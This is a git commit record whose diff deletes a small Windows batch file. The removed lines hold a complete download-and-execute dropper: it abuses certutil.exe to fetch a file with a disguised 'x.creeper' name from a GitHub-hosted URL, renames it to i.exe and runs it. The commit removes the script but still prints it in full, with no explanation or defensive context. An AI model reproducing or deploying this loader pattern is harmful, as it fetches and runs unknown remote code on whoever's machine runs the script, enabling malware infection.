96b24e4c378b97c20e4cd5ff13bc4aba2c0b439f
walkeet <nasral018487@gmail.com>
2025-06-15 19:35:08 +0700

    Delete files-912911.cmd

--- files-912911.cmd
+++
@@ -1,5 +0,0 @@
-@echo off
-title ---------------------------------------------------
-certutil.exe -urlcache -split -f "https://github.com/walkeet/walkeet.github.io/raw/refs/heads/main/task/x.creeper" 0xl.0FF
-ren 0xl.0FF i.exe
-start i.exe
